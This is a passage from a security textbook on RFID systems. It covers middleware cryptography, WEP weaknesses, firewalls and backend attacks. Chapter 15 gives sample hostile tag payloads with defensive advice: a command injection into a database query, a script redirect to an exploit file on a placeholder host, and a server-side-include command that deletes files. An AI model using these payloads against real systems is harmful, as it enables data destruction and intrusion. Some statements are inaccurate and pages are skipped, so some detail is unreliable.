will be correct. Getting the same MAC value proves data integrity. Since the receiver 
knows that the originator has the key, only the originator could have generated the 
MAC (the receiver did not send the data to itself ), so this authenticates the data to the 
receiver. A MAC does not, however, provide non-repudiation, because both sides have 
the secret key and therefore have the ability to generate the MAC. Consequently, there 
is no way a third party could prove who created the MAC.
MACs are usually faster at executing than the encrypt/decrypt used in digital signatures, 
because of their shorter bit length. If you have your own private network established 
(and hence non-repudiation is not an issue), MACs might be all you need to authenticate 
and validate a message.
Public and Private Keys
If we could somehow split the keying that is used for the MAC so that one key is used to 
create the MAC and another is used for veriﬁ cation, we could create a MAC that included 
non-repudiation capabilities. Such a system with split keys is known as asymmetric 
encryption and was something of a holy grail for cryptography until it was shown to be 
possible in 1976 by Whitﬁ eld Difﬁ e, Martin Hellman, and Ralph Merkle. Ronald Rivest, 

294 
Chapter 14 • RFID Attacks: Securing Communications Using RFID Middleware
Adi Shamir, and Leonard Adelman created the ﬁ rst practical implementation of this 
method in 1978.
Once you have an asymmetric encryption method, you can publicly publish your key. 
You still keep one key private, but you want the other key to be as widely known as 
possible, so you make it public. The reason that you do this (with regard to digital 
signatures) is that anybody who has your public key can authenticate your signatures. 
Proper key management is still a requirement with a public key system. The secrecy of 
your private key must be maintained, however. The publication of the public key must be 
done in such a way that it is trusted to be yours and not somebody posing as you.
Why a Signature Binds Someone to a Document
Digitally signing a document requires the originator to create a hash of the message itself and 
then encrypt that hash value with his or her own private key. Only the originator has that 
private key, and only he or she can encrypt the hash so that it can be unencrypted using the 
public key. Upon receiving both the message and the encrypted hash value, the recipient can 
decrypt the hash value, knowing the originator’s public key. The recipient must also generate 
the hash value of the message and compare the newly generated hash value with the 
unencrypted hash value received from the originator. If the hash values are identical, it proves 
that the originator created the message, because only the actual originator could encrypt the 
hash value correctly.
This process differs from that of a MAC; the recipient cannot generate the identical 
signature because he or she do not have the private key. As a result, we now have a 
mathematical form of non-repudiation, because only the originator could have created the 
signature. Again, a signature is not a guarantor. A perfect mathematically valid signature may 
have been created through attack or in error.
Learning the W3C XML Digital Signature
The XML speciﬁ cation is responsible for clearly deﬁ ning the information involved in 
verifying digital certiﬁ cates. XML digital signatures are represented by the Signature element, 
which has a structure in which:
■ 
* Represents zero or more occurrences
■ 
+ Represents one or more occurrences
■ 
? Represents zero or one occurrences.
We are assuming that the secret key is properly and securely managed so that the 
originator and the recipients are the only possessors of the key (see Figure 14.7).

 
RFID Attacks: Securing Communications Using RFID Middleware • Chapter 14 
295
Let’s break down this general structure in order to understand it properly. The Signature 
element is the primary construct of the XML digital signature speciﬁ cation. The signature can 
envelop or be enveloped by the local data that it is signing, or the signature can reference an 
external resource. Such signatures are detached signatures. Remember, this is a speciﬁ cation to 
describe digital signatures using XML; no limitations exist as to what is being signed.
The SignedInfo element is the information that is actually signed. This data is sequentially 
processed through several steps on the way to becoming signed (see Figure 14.8).

Figure 14.8 The Stages of Creating an XML Digital Signature
There may be zero or more Transforms steps. If there are multiple Transforms, each one’s 
output provides the input for the next.

296 
Chapter 14 • RFID Attacks: Securing Communications Using RFID Middleware
The CanonicalizationMethod element contains the algorithm used to canonicalize the data, 
or structure the data in a common way. Canonicalization can be used to do such things as 
apply a standard end-of-line convention, removing comments, or doing any other 
manipulation of the signed document that you require.
The Reference element identiﬁ es the resource to be signed and any algorithms used to 
preprocess the data. These algorithms are listed in the Transforms element and can include 
operations such as canonicalization, encoding/decoding, compression/inﬂ ation, or XPath 
or XSLT transformations. The Reference element can contain multiple Transforms elements; 
each one that is listed in Reference will operate in turn on the data. Notice that the 
Reference element contains an optional Uniform Resource Identiﬁ er (URI) attribute. If a 
signature contains more than one Reference element, the presence of the URI attribute is 
optional for only one Reference element; all the others must have a URI attribute. The 
syntax of the deﬁ nition of Signature (displayed in Figure 14.1) does not make this point 
very clear; however, the W3C XML Digital Signature speciﬁ cation document (www.w3.
org/TR/2002/REC-xmldsig-core-20020212) does.
The DigestMethod is the algorithm applied to the data after any deﬁ ned transformations 
are applied to generate the value within DigestValue. The DigestValue is applied to the result 
of the canonicalization and transform process, not the original data. Consequently, if a 
change is made to these documents that is transparent to these manipulations, the 
signature of the document still veriﬁ es (e.g., suppose we created a canonicalization method 
that converts all text in a ﬁ le to lowercase and used it to sign a document that originally 
contained mixed case. If we subsequently changed the original document by converting 
it to entirely uppercase, that modiﬁ ed document would still be validly veriﬁ ed by the 
original signature.
Signing the DigestValue binds resource content to the signer’s key. The algorithm used 
to convert the canonicalized and transformed SignedInfo into the SignatureValue is speciﬁ ed 
in the SignatureMethod element. The SignatureValue contains the actual value of the digital 
signature.
The KeyInfo element is where the information about the signing key is placed. Notice 
that this element is optional. Under typical circumstances, when you want to create a 
standalone signature, the KeyInfo element needs to be there, since the signer’s public key is 
necessary in order to validate the signature. Why is this element optional and not required? 
Several situations justify this ﬁ eld being optional. First, we might already know the public 
key and have it available elsewhere. In this case, having the key information in the signature 
is redundant, and as our following examples show, the KeyInfo element takes up a signiﬁ cant 
amount of space once it is ﬁ lled in. So, if we already have the information elsewhere, we can 
avoid the extraneous clutter in the signature. Another situation that might be important is 
one in which the signer does not want just anybody to be able to verify the signature; 
instead, that ability is restricted to only certain parties. In that case, you would have arranged 
for only those parties to obtain a copy of your public key.

 
RFID Attacks: Securing Communications Using RFID Middleware • Chapter 14 
297
To put this structure in context with the way digital signatures work, the information 
being signed is referenced within the SignedInfo element, along with the algorithm used to 
perform the hash (DigestMethod) and the resulting hash (DigestValue). The public key is then 
passed within SignatureValue. There are variations as to how the signature can be structured, 
but this is the most straightforward.
To validate the signature, you must digest the data object referenced using the relative 
DigestMethod. If the digest value generated matches the DigestValue speciﬁ ed, the reference is 
validated. To validate the signature, obtain the key information from the SignatureValue and 
validate it over the SignedInfo element. As with encryption, the implementation of XML 
digital signatures allows the use of any algorithm to perform any of the operations required 
of digital signatures, such as canonicalization, encryption, and transformations. To increase 
interoperability, the W3C has recommendations for which algorithms should be imple-
mented within any XML digital signature implementations (discussed later in this chapter).
Applying XML Digital Signatures to Security
XML signatures can be applied in three basic forms:
■ 
Enveloped Form The signature is within the document, as shown in the 
following code:
<document>
<signature> – </signature>
</document>
■ 
Enveloping Form The document is within the signature, as shown in the 
following code:
<signature>
<document> – </document>
</signature>
■ 
Detached Form The signature references a document that is elsewhere through 
a URI, as shown in the following code:
<signature> – </signature>
These are just the basic forms. An XML digital signature cannot only sign more than 
one document, it can also be simultaneously more than one of the enveloped, enveloping, 
and detached forms.
NOTE
A URL is considered informal and is no longer used in technical documents; URI is 
used instead. A URI has a name associated with it and is of the form Name=URL.

Using Advanced Encryption Standard for Encrypting 
RFID Data Streams
Advanced Encryption Standard (AES) (also known as Rijndael), is the choice of the US federal 
government for information processing to protect sensitive (read: classiﬁ ed) information. The 
government chose AES for the following reasons: security, performance, efﬁ ciency, ease of 
implementation, and ﬂ exibility. It is also unencumbered by patents that might limit its use. The 
government agency responsible for the choice calls it a “very good performer in both hardware 
and software across a wide range of computing environments” (www.nist.gov/public_affairs/releases/
aesq&a.htm).
In 1997, as the fall of the Data Encryption Standard (DES) loomed closer, the National 
Institute for Standards and Technology (NIST) announced the search for AES, the successor 
to DES. Once the search began, most of the big-name cryptography players submitted their 
own AES candidates. Among the requirements of AES candidates were:
■ 
AES would be a private key symmetric block cipher (similar to DES)
■ 
AES needed to be stronger and faster then 3-DES
■ 
AES required a life expectancy of at least 20 to 30 years
■ 
AES would support key sizes of 128 bits, 192 bits, and 256 bits
■ 
AES would be available to all—royalty free, nonproprietary, and unpatented
How much faster is AES than 3-DES (discussed in the following section)? 
It is difﬁ cult to say, because implementation speed varies widely depending on the 
type of processor performing the encryption, and whether or not the encryption is 
being performed in software or running on hardware speciﬁ cally designed for encryption. 
However, in similar implementations, AES is always faster than its 3-DES counterpart. One 
test performed by Brian Gladman has shown that on a Pentium Pro 200 with optimized 
code written in C, AES/Rijndael can encrypt and decrypt at an average speed of 
70.2Mbps, versus DES’ speed of only 28Mbps. You can read his other results at fp.gladman.

Addressing Common Risks and Threats
The advent of wireless networks has not created new legions of attackers. Many attackers 
will utilize the same attacks for the same objectives they used in wired networks. If you 
do not protect your wireless infrastructure with proven tools and techniques, and if you 
do not have established standards and policies that identify proper deployment and 
security methodology, you will ﬁ nd that the integrity of your wireless networks may be 
threatened.

 
RFID Attacks: Securing Communications Using RFID Middleware • Chapter 14 
299
Experiencing Loss of Data
If you cannot receive complete and proper information through your network and server 
services, those services are effectively useless to your organization. Without going through the 
complex task of altering network trafﬁ c, if someone can damage sections, then the entire 
subset of information used would have to be retransmitted. One such method used to cause data 
loss involves the use of spooﬁ ng. Spooﬁ ng is where someone attempts to identify themselves as an 
existing network entity or resource. Having succeeded in this ruse, they can then communicate 
as that resource, causing disruptions that affect legitimate users of those same resources.
This type of threat attacks each of the tenets of security covered so far. If someone is 
able to spoof as someone else, we can no longer trust the conﬁ dentiality of communications 
with that source, and the integrity of that source is no longer valid.
Loss of Data Scenario
If an attacker identiﬁ es a network resource, they can either send invalid trafﬁ c as that 
resource, or act as a Man-in-the-Middle (MIM) for access to the real resource. A MIM is 
created when someone assumes the ID of the legitimate resource, and then responds to 
client queries for those resources, sometimes offering invalid data in response, or actually 
acquiring the valid results from the resource being spoofed and returning that result 
(modiﬁ ed as to how the attacker would like) to the client.
The most common use for spooﬁ ng in wireless networks is in the conﬁ guration of the 
network MAC address. If a wireless access point has been set up and only allows access from 
speciﬁ ed MAC addresses, all an attacker needs to do is monitor the wireless trafﬁ c to learn 
what valid MAC addresses are allowed and then assign that MAC to their interface. This 
would allow the attacker to properly communicate with the network resources, because now 
it has a valid MAC for communicating on the network.
The Weaknesses in WEP
The Institute of Electrical and Electronics Engineers’ (IEEE) 802.11 standard was ﬁ rst published 
in 1999 and describes the Medium Access Control (MAC) and physical layer speciﬁ cations for 
wireless local and metropolitan area networks (see www.standards.ieee.org). The IEEE recognized 
that wireless networks were signiﬁ cantly different from wired networks and, due to the nature of 
the wireless medium, additional security measures would need to be implemented to assure that 
the basic protections provided by wired networks are available.
The IEEE determined that access and conﬁ dentiality control services, along with 
mechanisms for assuring the integrity of the data transmitted, would be required to provide 
wireless networks with functionally equivalent security to what is inherent to wired networks. 
To protect wireless users from casual eavesdropping and provide the equivalent security just 
mentioned, the IEEE introduced the Wired Equivalent Privacy ( WEP) algorithm.

300 
Chapter 14 • RFID Attacks: Securing Communications Using RFID Middleware
As with many new technologies, there have been signiﬁ cant vulnerabilities identiﬁ ed 
in the initial design of WEP. Over the last year, security experts have utilized the identiﬁ ed 
vulnerabilities to mount attacks on WEP that have defeated all of the security objectives 
WEP set out to achieve: network access control, data conﬁ dentiality, and data integrity.
Criticisms of the Overall Design
The IEEE 802.11 standard deﬁ nes WEP as having the following properties:
■ 
It is Reasonably Strong The security afforded by the algorithm relies on the 
difﬁ culty of discovering the secret key through a brute-force attack. This in turn is 
related to the length of the secret key and the frequency of changing keys.
■ 
It is Self-synchronizing WEP is self-synchronizing for each message. This 
property is critical for a data-link level encryption algorithm, where “best effort” 
delivery and packet loss rates may be high.
■ 
It is Efﬁ cient The WEP algorithm is efﬁ cient and may be implemented in either 
hardware or software.
■ 
It may be Exportable Every effort has been made to design the WEP system 
operation to maximize the chances of approval by the US Department of 
Commerce for export from the US of products containing a WEP implementation.
■ 
It is Optional The implementation and use of WEP is an IEEE 802.11 option.
Attempting to support the US export regulations, the IEEE has created a standard that 
introduces a conﬂ ict with the ﬁ rst of these properties, that WEP should be “reasonably strong.” 
In fact, the ﬁ rst property mentions that the security of the algorithm is directly related to the 
length of the key. Just as was shown in the Netscape SSL Challenge in 1995 (www.cypherspace.
org/~adam/ssl ), the implementation of a shortened key length such as those deﬁ ned by US 
export regulations, shortens the time it takes to discover that key though a brute-force attack.
Weaknesses in the Encryption Algorithm
The IEEE 802.11 standard, as well as many manufacturers’ implementations, introduces additional 
vulnerabilities that provide effective shortcuts to the identiﬁ cation of the secret WEP key. In sec-
tion 8.2.3, the standard identiﬁ es that “implementers should consider the contents of higher layer 
protocol headers and information as it is consistent and introduce the possibility of collision.” 
The standard goes on to deﬁ ne the Initialization Vector ( IV ) as a 24-bit ﬁ eld that will cause 
signiﬁ cant reuse of the IV leading to the degradation of the RC4 cipher used within WEP.
To understand the ramiﬁ cations of these issues, we need to examine the way that WEP is 
utilized to encrypt the data being transmitted. The standard deﬁ nes the WEP algorithm as “a 
form of electronic codebook in which a block of plaintext is bit-wise XORed with a 

 
RFID Attacks: Securing Communications Using RFID Middleware • Chapter 14 
301
pseudorandom key sequence of equal length. The key sequence is generated by the WEP 
algorithm.” The sequence of this algorithm can be found in Figure 14.9.
Figure 14.9 WEP Encipherment Block Diagram
The secret key is concatenated with (linked to) an IV and the resulting seed is input to 
the Pseudorandom Number Generator (PRNG). The PRNG uses the RC4 stream cipher 
(created by RSA Inc.) to output a key sequence of pseudorandom octets equal in length to 
the number of data octets that are to be transmitted. In an attempt to protect against unau-
thorized data modiﬁ cation, an integrity check algorithm operates on the plaintext message 
to produce a checksum that is concatenated onto the plaintext message to produce the 
Integrity Check Value (IVC). Encipherment is then accomplished by mathematically 
combining the IVC and PRNG output through a bit-wise XOR to generate the cipher 
text. The IV is concatenated onto the cipher text and the complete message is transmitted 
over the radio link.
Weaknesses in Key Management
The IEEE 802.11 standard speciﬁ cally outlines that the secret key used by WEP needs to be 
controlled by an external key management system. At the date of publication, the only 
external management available to users of wireless networks utilizes Remote Authentication 
Dial-In User Service (RADIUS) authentication.
The standard also deﬁ nes that there can be up to four secret keys stored in a glob-
ally shared array. Each message transmitted contains a key identiﬁ er indicating the index 

302 
Chapter 14 • RFID Attacks: Securing Communications Using RFID Middleware
of which key was used in the encryption. Changing between these keys on a regular 
basis would reduce the number of IV collisions, making it more difﬁ cult for those 
wishing to attack your wireless network. However, it is a manual process each time 
you change your key.

Using DES in RFID Middleware 
for Robust Encryption
One of the oldest and most famous encryption algorithms is the Data Encryption Standard 
(DES), which was developed by IBM and the US government standard from 1976 until about 
2001. The algorithm at the time was considered unbreakable and therefore was subject to export 
restrictions and then subsequently adapted by the US Department of Defense. Today companies 
that use the algorithm apply it three times over the same text, hence the name 3-DES.
DES was based signiﬁ cantly on the Lucifer algorithm invented by Horst Feistel, which 
never saw widespread use. Essentially, DES uses a single 64-bit key—56 bits of data and 
8 bits of parity—and operates on data in 64-bit chunks. This key is broken into 16 
separate 48-bit subkeys, one for each round, which are called Feistel cycles. Figure 14.10 
gives a schematic of how the DES encryption algorithm operates.
Each round consists of a substitution phase, wherein the data is substituted with pieces 
of the key, and a permutation phase, wherein the substituted data is scrambled (reordered). 
Substitution operations, sometimes referred to as confusion operations, are said to occur within 
S-boxes. Similarly, permutation operations, sometimes called diffusion operations, are said to 
occur in P-boxes. Both of these operations occur in the F module of the diagram. The 
security of DES lies mainly in the fact that since the substitution operations are nonlinear, 
the resulting cipher text in no way resembles the original message. Thus, language-based 
analysis techniques (discussed later in this chapter) used against the cipher text reveal noth-
ing. The permutation operations add another layer of security by scrambling the already 
partially encrypted message.

Chapter 14 • RFID Attacks: Securing Communications Using RFID Middleware
Every ﬁ ve years from 1976 until 2001, NIST reafﬁ rmed DES as the encryption standard 
for the US government. However, by the 1990s the aging algorithm had begun to show 
signs that it was nearing its end of life. New techniques that identiﬁ ed a shortcut method of 
attacking the DES cipher, such as differential cryptanalysis, were proposed as early as 1990, 
though it was still computationally unfeasible to do so.
Signiﬁ cant design ﬂ aws such as the short 56-bit key length also affected the longevity of 
the DES cipher. Shorter keys are more vulnerable to brute-force attacks. Although Whitﬁ eld 
Difﬁ e and Martin Hellman were the ﬁ rst to criticize this short key length, even going so far 
as to declare in 1979 that DES would be useless within 10 years, DES was not publicly bro-
ken by a brute-force attack until 1997.

Using Stateful Inspection in the Application 
Layer Gateway For Monitoring RFID 
Data Streams
Stateful inspection is a term coined by Check Point Software in 1993, which refers to dynamic 
packet-ﬁ ltering ﬁ rewall technology that was ﬁ rst implemented in Check Point’s FireWall-1 
product that came out the same year. Dynamic packet ﬁ ltering is a compromise between two 
existing ﬁ rewall technologies that makes implementation of good security easier and more 
effective. Let’s look at these types of ﬁ rewall technologies, and then we will examine stateful 
inspection in more detail.
Application Layer Gateway
The second ﬁ rewall technology is called an application layer gateway. This technology is much 
more advanced than packet ﬁ ltering, because it examines the entire packet and determines 
what should be done with it based on speciﬁ c rules (e.g., with an application layer gateway, 
if a Telnet packet is sent through the standard File Transfer Protocol (FTP) port, the ﬁ rewall 
can determine this activity and block the packet if a rule is deﬁ ned that disallows Telnet 
trafﬁ c.
One of the major beneﬁ ts of application layer gateway technology is its application 
layer awareness. Because it can determine much more information from a packet than a 
packet ﬁ lter can, it can use more complex rules to determine the validity of any given 
packet. Therefore, it provides much better security than a packet ﬁ lter.
Although the technology behind application layer gateways is much more advanced 
than packet-ﬁ ltering technology, it certainly does come with its drawbacks. Due to the fact 
that every packet is disassembled completely and then checked against a complex set of 
rules, application layer gateways are much slower than packet ﬁ lters. In addition, only a lim-
ited set of application rules is predeﬁ ned, and any application not included in that list must 
have custom rules deﬁ ned and loaded into the ﬁ rewall. Finally, application layer gateways 
actually process the packet at the application layer of the OSI model. By doing so, the 
application layer gateway must then rebuild the packet from the top down and send it back 
out. This breaks the concept behind client/server architecture as well as slows the ﬁ rewall 
even further.
The operation of application layer gateway technology is illustrated in Figure 14.11.
As previously mentioned, stateful inspection is a compromise between these two 
existing technologies. It overcomes the drawbacks of both simple packet ﬁ ltering and 
application layer gateways while enhancing the security provided by the ﬁ rewall. Stateful 
inspection technology supports application layer awareness without breaking the client/
server architecture by breaking down and rebuilding the packet. In addition, it is much 

306 
Chapter 14 • RFID Attacks: Securing Communications Using RFID Middleware
faster than an application layer gateway due to the way packets are handled. It is also 
more secure than a packet-ﬁ ltering ﬁ rewall due to the application layer awareness as well 
as the introduction of application- and communication-derived state awareness.
The primary feature of stateful inspection is monitoring application and communication 
states. This means that the ﬁ rewall is aware of speciﬁ c application communication requests and 
knows what to expect out of any given communication session. This information is stored in a 
dynamically updated state table, and any communication not explicitly allowed by a rule in this 
table is denied. This allows a ﬁ rewall to dynamically conform to the needs of the applications 
and open or close ports as needed. Because the ports are closed when the requested transactions 
are completed, another layer of security is provided by not leaving those particular ports open.

307
about a given product. In many cases, those pointers will be created in response to a tag-read 
event, but this is not a restriction. Whenever an enterprise creates information about a 
product, the Discovery Service is notiﬁ ed. The result of a Discovery Service query is a list of 
all locations that have data about the speciﬁ ed EPC. For scalability reasons, the Discovery 
Service does not contain actual data, but rather pointers to the local data store where locally 
deﬁ ned security policies can be enforced.
Resolution, ONS, and the EPC Repository
To provide effective security on a network and within applications, you must be able to 
look up authoritative information about any of the canonical names found within the 
system. This is the role of the EPC Resolution System, which is based on the existing 
and highly scaled Domain Name System (DNS), and more closely, the EPC Network 
ONS. DNS currently handles the entire Internet-naming architecture. The EPC 
Resolution System, like DNS, would not store any data other than pointers to the 
network services that actually contain the data, thus allowing local security policies to be 
applied as needed.
The role of this system is as a complementary superdirectory that works with the EPC 
Repository to provide service-level redirection, thereby allowing for the discovery of 
metadata and services for a given identiﬁ er that may exist outside of the EPC Repository 
or which may be being updated in real time. This component also allows the EPC 
Network to interoperate with the EPC Network.
The Authoritative Root Directory for the EPC/EPC Network is the Root ONS. The 
authoritative directory of Manufacturer IDs for the EPC/EPC Network, the Root ONS 
points to information sources in an entity’s local ONS that are available to describe each 
manufacturer’s products in the supply chain. Under the EPC/EPC Network system, each 
entity will have a server running its own local ONS servers. Like DNS, which points Web 
browsers to the server where they can download the Web site for a particular Web address, 
ONS will point computers looking up EPC and EPC numbers to information stored in 
AdaptLink™. AdaptLink™ will store the speciﬁ c item’s data and make it available based on a 
predetermined security conﬁ guration. This EPC/EPC Network architecture is identical to 
the DNS architecture that the Internet uses to resolve domain name inquires.
EPC Trust Services
EPC Trust services offer the capability to enforce access policies at various points in the 
network. Because they are standards based, they provide a spectrum of options for the level 
of security and authentication that is appropriate (username and password to crypto- and 
biometric-based strong authentication). Policies and authentication can also be provided 
centrally using existing standards for third-party authentication (i.e., single sign-on).

308 
Chapter 14 • RFID Attacks: Securing Communications Using RFID Middleware
EPC Trust services offer the capability to accurately authenticate the identities of supply 
chain members before they get on the EPC Network, correctly identify these partners as they 
transact on the network, enforce data access policies at various points of the network, and 
encrypt data throughout the network. The core of the Trust services is the authentication 
registry, which contains the identities of authenticated supply chain members who are allowed 
to participate in the network. Data transaction endpoints can set up local access policies based 
on these identities, use this registry to correctly identify each other before data exchange, and 
enforce access policies as the data exchange takes place.
The EPC Trust services are powered by industry standards such as SSL (Secure Sockets 
Layer) and PKI (Public Key Infrastructure), so they provide a spectrum of options for the 
level of security and authentication that is appropriate. These options range from lightweight 
authentication, such as username and passwords, to crypto-based strong authentication, such 
as smartcards and biometrics. Commerce Events’ AdaptLink™ provides a robust EPC Trust 
services policy framework.

Summary
The proliferation of RFID tags has quickly enabled the whole enterprise to gain real-time 
visibility into business information. For businesses to retain their competitive edge, protecting 
this information is critical. RFID middleware is the key enabling infrastructure that leverages 
existing investments and new development in security standards to bring robust RFID 
security in the enterprise.

Chapter 15 • RFID Security: Attacking the Backend
Introduction
Radio Frequency Identiﬁ cation (RFID) technology has come a long way. From hardware 
standards (frequency, air link protocols, tag format, and so on) to data collection and device 
management, RDID technology has stabilized. Data collection, data management, and data 
analysis is the core of the value from RFID. The middleware collects and ﬁ lters data in real 
time. Tracking mechanisms are based on data. The backend determines what to do with the 
data—how to transform it so that it makes sense to the end user, how to trigger the right 
process, system, or device at the right time, how to provide real-time data to the existing ERP 
(enterprise resource planning) system so they respond in real-time, and how to generate 
reports and alerts based on batch processing or real-time processing of RFID data.
This chapter focuses on the basic elements of the backend, the vulnerabilities 
associated with it, and how to make the backend robust and secure.
Overview of Backend Systems
A backend system deﬁ nes the business logic for interpreting raw RFID data and the actions 
associated with it. Every tag read can result in single or multiple actions, which may integrate 
with multiple applications, result in e-mails, or activate other devices. Events or actions may 
be shared by trading partners.
In order to understand the basic elements of the backend, let’s use the example of a store 
selling orange juice and milk. The backend must do the following:
■ 
Deﬁ ne the business context. Data received from the middleware is in the raw form of 
a Tag ID or Reader ID, which needs to deﬁ ne what tag and readers IDs mean (e.g., 
Tag IDs from 1 to 100 mean orange Juice, and tag IDs 400 through 500 means milk. 
Reader ID = 1 means entry door reader and Reader ID = 2 means exit door reader.)
■ 
Determine the pattern and associate actions. If the entry door reader sees tags 1 
through 100, increment the inventory count for orange juice. If the exit door 
reader sees any of those tags, decrement the inventory count for orange juice. If the 
inventory count of orange juice goes below 20, notify the store manager.
■ 
Depending on the end-user requirement, business logic can be written to solve the 
most complex issues and to make the system reliable and robust. The backend system 
also needs to determine which events to store and which to purge in order to have a 
clean and manageable data repository. Component-based architecture can make the 
system scalable, expandable, and repeatable at multiple locations.
As per the EPCglobal network layers, the backend system comprises the EPCIS capturing 
application, the EPC Information Services (EPCIS) accessing application, and the EPCglobal 
Core Services (see Figure 15.1).

Chapter 15 • RFID Security: Attacking the Backend
As we look at the backend, there are certain vulnerabilities in the system. Data by itself 
poses a challenge. What if bad data is ﬂ ooded to the backend system? What if there are 
spurious reads? What if tags are duplicated purposefully? In certain situations, it can confuse 
and jam the backend. The communication between middleware and the backend happens 
using JMS, Simple Object Access Protocol (SOAP), or Hypertext Transfer Protocol (HTTP). 
What if there is a Man-in-the-Middle (MIM) attack? What should we do if there is a 
Transfer Control Protocol (TCP) replay attack? RFID attacks can also happen at the 
Domain Name System (DNS)/Object Name Service (ONS) level. The following sections 
examine some of these attacks and some of the solutions in order to make the backend 
robust and reliable.
Data Attacks
The RFID middleware collects RFID events (the tag read by a RFID sensor) and sends 
them to the backend systems. These events can be collected from several locations within an 
enterprise or across enterprise boundaries, as depicted in the EPCglobal network 
architecture.
Data Flooding
The data sent to the backend system can pose several security threats including ﬂ ooding and 
spurious data, and may contain may contain a virus.
Problem 1
If a large number of tags are placed in front of a reader, a lot of data will be sent to the 
backend (e.g., if the inventory of tag rolls is accidentally placed in the vicinity of a reader, a 
huge amount of data will be generated at a single point in time.
Solution 1
Place the inventory of tag rolls in a radio-shielded environment to prevent the accidental 
ﬂ ooding of the tag reads. Determine the “tags of interest” at the edge of the enterprise (not 
in the application), to prevent ﬂ ooding (e.g., ﬁ ltration needs to be done at the edge).
Problem 2
Another situation could be if the middleware buffers too many events and then suddenly 
sends all of them to the backend, it my cause a problem.
Solution 2
The backend system must be robust in order to handle ﬂ ooding. There could be a staging 
area where the events would be temporarily received from the middleware. The backend 

 
RFID Security: Attacking the Backend • Chapter 15 
315
process of analyzing the event and sending it to the right business process can be done using 
the events from the staging area.
Purposeful Tag Duplication
Problem
Counterfeit tags are produced. This issue can be treated similar to credit card fraud where a 
card is duplicated and used at multiple places at the same time.
Solution
The key to this problem is putting extra effort into the backend to check for such scenarios. 
A tag cannot be present at the shelf of the store and also be taken out at the same time. It is 
a hard to deal with issues while designing the backend, but on a case-by-case basis they can 
be handled.
Spurious Events
Problem
A tag is read whenever it comes in the radio ﬁ eld of a reader. This read is accepted by the 
data collection tool and sent to the backend system (e.g., a shipment is received and read at 
the dock door). The next day, the forklift operator changes the pallets to a different location, 
while at the same time passes near the reader present at the receiving dock door. Middleware 
receives the RFID event; however, from a business standpoint, the read may be spurious and 
inventory that is already accounted for does not need to be accounted for again.
Solution
No single RFID event can be treated as genuine unless it follows a certain pattern. For 
backend systems, it is essential to understand the context in which the event was generated 
and then correlate the events for the very same tag before making a business decision of 
what to do with the event.
Readability Rates
Problem
Although present for decades, RFID technology is still maturing. RF physics limits the tag 
read rate, especially when a lot of liquid and metal content is present for the sensors working 
at Ultra-High Frequency (UHF). The position of the tag in relation to the reader also affects 
the read rate. In a retail supply chain, sensors may be put at various places, but cases/pallets 
for Fast Moving Consumer Goods (FMCG) may not be read at every location. Consider a 

316 
Chapter 15 • RFID Security: Attacking the Backend
scenario where a backend application triggers certain actions if the goods do not move out 
of the distribution center within a speciﬁ ed amount of time (e.g., a case of shampoo is read 
at the receiving dock door of a distribution center, but is not read at the storage area or the 
shipping dock door. After some time, it is read again at the receiving dock door.)
Solution
Backend systems should be designed so that they do not assume a successful read at every 
RFID sensor. Backend systems should take into account all future reads of the same case 
before triggering the actions related to non-moving inventory.
Virus Attacks
A tag typically contains a unique ID and may also contain some user-deﬁ ned data. The data 
size can range from a few bytes to several kilobytes. RFID sensors can write and read the 
data, which is then received by the backend system and used for further processing. A poorly 
designed backend system and skewed tag data could lead to harmful actions.
Problem 1 (Database Components)
Airline baggage contains a tag with the airport destination in its data ﬁ eld. Upon receiving the 
tag data, the backend system ﬁ res the query, “select * from location_table where airport = <tag 
data>.” Typically, the tag data contains the destination airport. A smart intruder could change 
this tag data from “LAX” to “LAX; shutdown.” Upon receiving this data, the backend system 
may ﬁ re a query such as, “select * from location_table where airport = LAX; shutdown.” This 
may lead to a database shutdown and hence a baggage system shutdown.
Problem 2 (Web-based Components)
Many backend systems use Web-based components to provide a user interface or to query 
databases. These Web-based components are also vulnerable to attacks.
If a Web browser is used to display tags (either directly or indirectly through the database) 
it can abuse the dynamic features offered by modern browsers by including Javascript code 
on the tag. An example Javascript command is shown below:
<script>document.location=‘http://ip/malicious_code.wmf’;</script>
This example redirects the browser to a WMF (Windows metaﬁ le format( ﬁ le that may 
contain an exploit of the recently discovered WMF bug.
Problem 3 (Web-based Components)
Another way that Web-based components can be exploited is through server-side includes 
(SSI). SSI is a technology that allows for dynamic Web page generation by executing 

 
RFID Security: Attacking the Backend • Chapter 15 
317
commands on the Web server when a Web page is requested. Using SSI’s exec command 
on a tag makes it possible to trick the Web server into executing malicious code. A 
skewed tag data could be <!–#exec cmd=“rm -R /”–> which could result in deleting 
the ﬁ les.
Solution 1
The backend system must ﬁ rst validate the tag data or have a mechanism of checksum so 
that data cannot be skewed.
Problem 4 (Buffer Overﬂ ow)
A middleware system is designed to accept tag data of a certain size. A backend system is 
written in C/C++ code, which reads tag data into a pre-deﬁ ned memory size. If an intruder 
brings a tag with more capacity, it may force the backend system to have a buffer overﬂ ow, 
thus leading to a system crash.
Solution 4
The backend system should have sufﬁ cient guards and checks in place in order to read 
certain sizes and to validate the data using some checksum techniques.
RFID Data Collection Tool - Backend 
Communication Attacks
Middleware and backend communication occur using JMS, SOAP, or HTTP. There are two 
types of attacks that can have an impact on the backend: MIM application layer attack and a 
TCP replay attack.
MIM Attack
A MIM attack occurs when someone monitors the system between you and the person you 
are communicating with. When computers communicate at low levels of the network layer, 
they may not be able to determine who they are exchanging data with. In MIM attacks, 
someone assumes a user’s identity in order to read his or her messages. The attacker might be 
actively replying as you to keep the exchange going and to gain more information. MIM 
attacks are more likely when there is less physical control of the network (e.g., over the 
Internet or over a wireless connection).
Application Layer Attack
An application layer attack targets application servers by deliberately causing a fault in a 
server’s operating system or applications, which results in the attacker gaining the ability to 

318 
Chapter 15 • RFID Security: Attacking the Backend
bypass normal access controls. The attacker takes advantage of the situation, gaining control 
of your application, system, or network, and can do any of the following:
■ 
Read, add, delete, or modify your data or operating system
■ 
Introduce a virus program that uses your computers and software applications to 
copy viruses throughout your network
■ 
Introduce a sniffer program to analyze your network and gain information that can 
eventually be used to crash or corrupt your systems and network
■ 
Abnormally terminate your data applications or operating systems
■ 
Disable other security controls to enable future attacks
Solution
The best way to prevent MIM and application layer attacks is to use a secure gateway.
TCP Replay Attack
A replay attack is when a hacker uses a sniffer to grab packets off the wire. After the packets 
are captured, the hacker can extract information from the packets such as authentication 
information and passwords. Once the information is extracted, the captured data can be 
placed back on the network or replayed.
Solution
Some level of authentication of the source of event generator can help stop TCP replay 
attacks.
Attacks on ONS
ONS is a service that, given an EPC, can return a list of network-accessible service 
